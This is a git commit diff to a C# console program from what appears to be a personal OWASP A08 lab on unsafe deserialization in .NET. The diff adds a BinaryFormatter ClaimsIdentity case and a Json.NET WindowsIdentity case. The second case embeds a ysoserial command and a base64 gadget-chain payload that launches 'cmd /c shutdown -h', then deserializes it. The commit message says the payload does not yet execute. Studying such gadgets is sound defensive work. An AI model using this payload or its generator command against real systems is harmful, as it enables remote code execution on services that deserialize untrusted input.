c78df949948529169207d420a377223e9adc1e3d
sharp-circles <sharpcirclesorg@gmail.com>
2025-10-30 19:39:14 +0100

    Playing a bit with generated payloads. So far not executing :(

--- Program.cs
+++ Program.cs
@@ -1,39 +1,114 @@
-﻿Console.WriteLine("******************************************");
+﻿using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+using System.Runtime.InteropServices;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Security.Claims;
+using System.Security.Principal;
+
+int index;
+Tuple<string, string> classFormatterPair;
+string command;
+string serializedOutput;
+
+Console.WriteLine("******************************************");
 Console.WriteLine("***** Unsafe deserialization in .NET *****");
 Console.WriteLine("******************************************");
-Console.WriteLine();
 
-Console.WriteLine(" -- Use case 1 -- [ClaimIdentity - BinaryFormatter]");
-Console.WriteLine();
-Console.WriteLine("Starting use case 1");
-Console.WriteLine();
-Console.WriteLine("[Summary]");
-Console.WriteLine("Gadget chain: ClaimIdentity");
-Console.WriteLine("Formatter: BinaryFormatter");
-Console.WriteLine("Command: ");
-Console.WriteLine("Serialized output:");
+index = 1;
+classFormatterPair = new Tuple<string, string>("ClaimIdentity", "BinaryFormatter");
 
-// Try catch block here
+// Use case 1 - ClaimIdentity and BinaryFormatter
+PrintSummary(index, classFormatterPair, string.Empty, string.Empty);
 
-Console.WriteLine("Use case 1 completed");
-Console.WriteLine();
+try
+{
+    var claims = new List<Claim>()
+    {
+        new(ClaimTypes.Name, "Iván"),
+        new(ClaimTypes.Role, "Admin"),
+        new(ClaimTypes.Email, "invented@gmail.com"),
+        new(ClaimTypes.AuthenticationMethod, "http://schemas.microsoft.com/ws/2008/06/identity/authenticationmethod/password")
+    };
 
-Console.WriteLine(" -- Use case 2 -- [ClaimPrincipal - BinaryFormatter]");
+    var claimsIdentity = new ClaimsIdentity(claims);
 
-Console.WriteLine();
-Console.WriteLine("[Summary]");
-Console.WriteLine();
-Console.WriteLine("Gadget chain: ClaimPrincipal");
-Console.WriteLine("Formatter: BinaryFormatter");
-Console.WriteLine("Command: ");
-Console.WriteLine("Serialized output:");
+    using var memoryStream = new MemoryStream();
 
-// Try catch block here
+#pragma warning disable SYSLIB0011 // Type or member is obsolete
+    var binaryFormatter = new BinaryFormatter();
+#pragma warning restore SYSLIB0011 // Type or member is obsolete
 
-Console.WriteLine("Use case 2 completed");
-Console.WriteLine();
+    binaryFormatter.Serialize(memoryStream, claimsIdentity);
+}
+catch (Exception ex)
+{
+    PrintError(index, ex.Message);
+}
+finally
+{
+    PrintBottomMessage(index);
+}
 
+index++;
+classFormatterPair = new Tuple<string, string>("WindowsIdentity", "Json.NET");
+command = @"ysoserial.exe - o raw - g WindowsIdentity - f Json.Net - c calc > ""C:\Users\IMS\Desktop\main\3. PROJECTS\sharp-circles\4. LABS\OWASP-10-A08-software-and-data-integrity\Payloads\payload-use-case-2.txt""";
+serializedOutput = @"{
+                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+                    'System.Security.ClaimsIdentity.actor': 'AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAugU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHNodXRkb3duIC1oIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs='
+                }";
 
+// Use case 2 - WindowsIdentity and Json.NET
+PrintSummary(index, classFormatterPair, command, serializedOutput);
 
+try
+{
+    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+    {
+        var windowsIdentity = JsonConvert.DeserializeObject<WindowsIdentity>(serializedOutput);
+    }
+}
+catch (Exception ex)
+{
+    PrintError(index, ex.Message);
+}
+finally
+{
+    PrintBottomMessage(index);
+}
 
+static void PrintSummary(int index, Tuple<string, string> classFormatterPair, string command, string serializedOutput)
+{
+    var summaryMessage = @$"-- Use case {index} -- [{classFormatterPair.Item1} - {classFormatterPair.Item2}]
+    
+Starting use case {index}
+    
+[Summary]
 
+Gadget chain: {classFormatterPair.Item1}
+Formatter: {classFormatterPair.Item2}
+Command: {(string.IsNullOrWhiteSpace(command) ? "Non applicable" : command)}
+Serialized output: {(string.IsNullOrWhiteSpace(serializedOutput) ? "Non applicable" : serializedOutput)}";
+
+    Console.WriteLine();
+    Console.WriteLine(summaryMessage);
+}
+
+static void PrintError(int index, string message)
+{
+    Console.WriteLine();
+    Console.WriteLine($"[Use case {index}] - Error: {message}");
+}
+
+static void PrintBottomMessage(int index)
+{
+    Console.WriteLine();
+    Console.WriteLine($"Use case {index} completed");
+}
+
+/*
+
+Json.NET commands
+
+ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -c calc > "C:\Users\IMS\Desktop\main\3. PROJECTS\sharp-circles\4. LABS\OWASP-10-A08-software-and-data-integrity\Payloads\payload-use-case-2.txt"
+
+*/
